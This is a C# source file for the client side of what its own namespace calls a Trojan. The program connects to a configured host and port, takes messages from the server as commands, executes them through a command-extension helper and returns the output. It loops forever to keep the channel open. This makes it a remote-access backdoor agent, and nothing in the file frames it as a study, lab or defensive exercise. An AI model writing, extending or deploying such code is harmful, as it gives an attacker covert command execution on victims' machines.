using System;
using System.Text;
using System.Net.Sockets;
using SocketData;
using Trojan.exceptions;

namespace client
{
    public class Client : SocketHandler
    {
        public socketSetup Connector;

        public async Task Send_Socket(Socket sock, string message, int SendTimeout)
        {
            if (sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(sock));

            await sock.SendAsync(Encoding.UTF8.GetBytes(message), SocketFlags.None);
        }

        public async Task Receive_Socket(socketSetup socketSetup, int ReceiveTimeout)
        {
            if (socketSetup.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(socketSetup.sock));

            byte[] tmpBuffer = new byte[socketSetup.buffSize];

            Task ReceiveTask = socketSetup.sock.ReceiveAsync(tmpBuffer, SocketFlags.None);

            if (await Task.WhenAny(ReceiveTask, Task.Delay(ReceiveTimeout)) == ReceiveTask)
            {
                string message = Encoding.UTF8.GetString(tmpBuffer).Replace("\0", "");
                if (tmpBuffer.Length > 0 && message.Length > 0)
                {
                    Console.WriteLine("\n[+] [{0}] Received_MessageFromServer[{1}] -- Message_Length[{2} characters] ;", socketSetup.getUUID(), message, message.Length);
                    socketSetup.buffer = tmpBuffer;

                    string command_parsed = CommandExtension.CheckForCommand(message);
                    if (command_parsed != "")
                    {
                        string Command_Data = CommandExtension.ExecuteCommand(command_parsed);
                        await Send_Socket(socketSetup.sock, Command_Data, SEND_TIMEOUT);
                    }
                    else if (command_parsed == "" && ReceiveTimeout == Timeout.Infinite)
                    {
                        await Send_Socket(socketSetup.sock, "\t[|] Command failed " + "[" + message + "]" + " [" + socketSetup.getUUID() + "]", SEND_TIMEOUT);
                    }

                    if (ReceiveTimeout == Timeout.Infinite) { await Receive_Socket(socketSetup, ReceiveTimeout); }
                }
                else
                {
                    throw new ExceptionHandler("[-] ReceiveTask timed out : " + nameof(ReceiveTask));
                }
            }
        }

        public async Task Init_Client(ushort port, uint buffSize)
        {
            if (HOST != null)
            {
                Connector = _SocketOperations.Init_Socket(HOST, new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
                await _SocketOperations.Connect_Socket(Connector);
                Task ConnectorReceiver = Task.Factory.StartNew(() => Receive_Socket(Connector, Timeout.Infinite));
            }
        }

        public static async Task Main()
        {
            Client client = new Client();
            await client.Init_Client(PORT, BUFFSIZE);

            while (true)
            {

            }
        }
    }
}
